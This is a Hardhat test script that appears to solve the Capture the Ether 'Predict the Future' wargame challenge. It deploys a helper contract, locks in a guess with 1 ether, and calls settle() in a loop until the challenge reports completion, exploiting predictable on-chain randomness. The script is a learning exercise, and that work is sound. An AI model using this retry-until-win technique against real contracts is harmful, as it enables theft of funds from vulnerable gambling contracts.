const { expect} = require("chai");
const { ethers } = require("hardhat");

before(async () => {
    accounts = await ethers.getSigners();
    eoa = accounts[0];
    const chFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
    var contract = await chFactory.attach(`0xF5a5ce6bD1e8fD4b23B85A1E9CA0b4c96CA391B8`);
  });
  
  it("ch8", async function () {
    
    const solFactory = await ethers.getContractFactory("PredictTheFutureSolution");
    var solContract = await solFactory.deploy(contract.address);
    console.log("deploying");
    // solContract = await solFactory.attach(`0x6C6e9e976bbD27D52cb40E2688f2bDE56D15D1Dd`);
    await solContract.deployed();
    console.log(solContract.address);

    var tx = await solContract.lockInGuess(0, {value:ethers.utils.parseEther("1.0"), gasLimit:3e6});
    console.log("lockin intitiated");
    await tx.wait();
    console.log("lockin completed");
   
    tryCount = 0;
    var isComplete = false;
    while (true) {
      console.log(tryCount);
      try {
        var tx2 = await solContract.settle({gasLimit:3e6});
        console.log("settling initiated");
        await tx2.wait();
        console.log("settle done, checking status...");
        isComplete = await contract.isComplete();
        if (isComplete) {
          break;
        }
      } catch (error) {
        console.log(error.message);
      }
      tryCount++;
    }  
    // isComplete = await contract.isComplete();
    // console.log("attack success");
    expect(isComplete).to.be.true;
  });
